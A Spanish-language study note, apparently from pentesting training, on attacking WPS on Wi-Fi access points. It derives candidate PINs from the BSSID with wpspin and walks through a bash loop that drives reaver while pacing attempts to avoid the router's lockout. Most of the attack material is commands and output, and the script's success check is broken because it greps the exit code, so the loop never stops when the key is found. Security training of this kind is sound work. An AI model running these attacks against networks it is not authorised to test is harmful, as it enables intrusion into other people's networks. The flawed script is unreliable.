---
tags:
  - Wi-Fi/WPS
  - Pentesting/Explotacion
Descripción: "Generar listas cortas de PIN candidatos a partir del BSSID y el fabricante, y automatizar los intentos sin disparar el bloqueo del AP"
Fecha de actualización: 2026-08-01
Nota previa: "[[04 - APs con bloqueo y rate limiting]]"
Nota siguiente: "[[06 - Algoritmos de generación de PIN]]"
Area: "[[WPS.base|WPS]]"
---
---

Contra un AP que bloquea, la fuerza bruta completa está descartada. <mark style="background: #ADCCFFA6;">La alternativa es reducir 11.000 candidatos a unas decenas, aprovechando que muchos fabricantes derivan el PIN de fábrica del propio BSSID o usan un valor estático para toda una gama</mark>. Con suerte, el PIN correcto está entre los diez primeros y el AP nunca llega a bloquearse.

# Identificar el fabricante

El OUI —los tres primeros bytes del BSSID— identifica al fabricante:

```shell-session
$ grep -i "60-38-E0" /var/lib/ieee-data/oui.txt
60-38-E0   (hex)		Belkin International Inc.
```

Si falta el fichero: `sudo apt install ieee-data`. Alternativa sin depender de él, con [[02 - Airodump-ng]]:

```shell-session
$ sudo airodump-ng --wps --manufacturer -c 1 --bssid 60:38:E0:A2:3D:2A mon0
```

<mark style="background: #FFB8EBA6;">Los campos `manufacturer`, `model_name` y `model_number` del WPS IE son más fiables que el OUI</mark>, porque los publica el propio AP y el OUI sólo identifica a quien fabricó la placa. [[00 - Reaver y wash|`wash -j`]] los extrae directamente — el detalle de cada campo está en [[02 - Reconocimiento de WPS]].

# Generar los candidatos

`wpspin` implementa las familias de algoritmos conocidas y devuelve todos los PIN plausibles para un BSSID:

```shell-session
$ wpspin -A 60:38:E0:A2:3D:2A

Found 49 PIN(s)
PIN       Name
73834410  44-bit PIN
94229882  Static PIN — H108L
06490959  Reverse bits 32-bit
11184812  24-bit PIN
63311501  Reverse nibble 32-bit
...
12345670  Static PIN — Cisco
74244973  OUI + NIC
```

Se distinguen dos familias, con lógica muy distinta:

- **Derivados del BSSID** — `24-bit PIN`, `32-bit PIN`, `OUI + NIC`, `Reverse byte`… Toman parte de la dirección MAC, aplican una transformación y calculan el checksum. Cambian con cada AP.
- **PIN estáticos** — `Static PIN — Cisco`, `Static PIN — Broadcom 1`… Valores fijos que un fabricante grabó en toda una serie. El clásico `12345670` de Cisco es el más conocido.

> [!warning]+ El repositorio que enlaza HTB no es el de referencia
> El módulo apunta a [`epicdev420/WPSPin`](https://github.com/epicdev420/WPSPin), que existe y recibe cambios pero es marginal (una decena de estrellas). El proyecto original y más usado, `drygdryg/wpspin`, junto con su hermano `OneShot`, **ya no está disponible en GitHub** — comprobado el 2026-08-01. <mark style="background: #FF5582A6;">Antes de instalar cualquier fork de una herramienta desaparecida conviene revisar el código</mark>: son objetivos evidentes para un *typosquat*.
>
> La vía mantenida hoy es **[airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)** (activo en julio de 2026), que integra la generación de PIN y su prueba automatizada en un menú, sin depender de un script suelto.

# Automatizar las pruebas

Lanzar reaver a mano por cada PIN es inviable. Extraer sólo los números:

```shell-session
$ wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | sort -u > pins.txt
```

Y recorrerlos con una pausa suficiente para no disparar el bloqueo:

```bash
#!/usr/bin/env bash
BSSID="60:38:E0:A2:3D:2A"
CANAL=1
IFACE=mon0

while read -r PIN; do
    echo "[*] Probando $PIN"
    sudo reaver -i "$IFACE" -b "$BSSID" -c "$CANAL" -p "$PIN" \
                --max-attempts=1 -l 100 -r 3:45 2>&1 \
        | grep -E "WPS PIN|WPA PSK|rate limiting" \
        && { grep -q "WPA PSK" <<< "$?" && break; }
    sleep 20
done < pins.txt
```

Las opciones que hacen que esto no queme el AP —el detalle de cada una está en [[00 - Reaver y wash]] y su efecto sobre el bloqueo, en [[04 - APs con bloqueo y rate limiting]]:

| Opción | Efecto |
| ------ | ------ |
| `--max-attempts=1` | Probar el PIN una vez y salir. Sin ella, reaver seguiría por su cuenta |
| `-l 100` | Esperar 100 s si detecta bloqueo |
| `-r 3:45` | Pausa de 45 s cada 3 intentos |
| `sleep 20` | Separación adicional entre PINs |

<mark style="background: #8000E1A6;">A ese ritmo, 49 candidatos son unos 30–40 minutos</mark>. Comparado con las horas de la fuerza bruta completa y con el riesgo de bloqueo permanente, es la relación coste-beneficio correcta contra un AP protegido.

# Priorizar antes de probar

Con 49 candidatos y un AP que bloquea a los 3 intentos, el orden importa muchísimo. La heurística:

1. **PIN nulo** — cero coste.
2. **PIN estático del fabricante identificado.** Si el OUI dice Cisco, `12345670` va primero.
3. **Derivados del BSSID de la familia del chipset.** Realtek, Broadcom y Ralink tienen algoritmos concretos asociados.
4. **El resto**, por orden decreciente de frecuencia.

Filtrar por fabricante en lugar de usar `-A`:

```shell-session
$ wpspin 60:38:E0:A2:3D:2A
```

Sin `-A`, `wpspin` devuelve sólo los algoritmos que corresponden a ese OUI — una lista mucho más corta y mucho más probable.

# Otras fuentes de PIN

| Fuente | Cuándo aplica |
| ------ | ------------- |
| **La etiqueta del AP** | Si hay acceso físico. Instantáneo, y exige modo `LAB` |
| **Panel de administración** | Si se ha comprometido el AP por otra vía, el PIN está ahí |
| **Documentación del fabricante** | Algunas gamas publican el algoritmo o el valor por defecto |
| **Bases de datos comunitarias** | Repositorios de PIN por BSSID recogidos por *war driving* |

> [!warning]+ Cuidado con las bases de datos online
> Existen servicios que devuelven el PIN de un BSSID a partir de colecciones comunitarias. <mark style="background: #FFB86CA6;">Consultarlos envía el BSSID del cliente a un tercero</mark>, lo que en un engagement es una fuga de información sobre la infraestructura del cliente y probablemente una violación del NDA. Si se usan, tiene que estar contemplado en las reglas de compromiso.

La lógica interna de esos algoritmos —qué transformación aplica cada uno y por qué funcionan— es [[06 - Algoritmos de generación de PIN]].
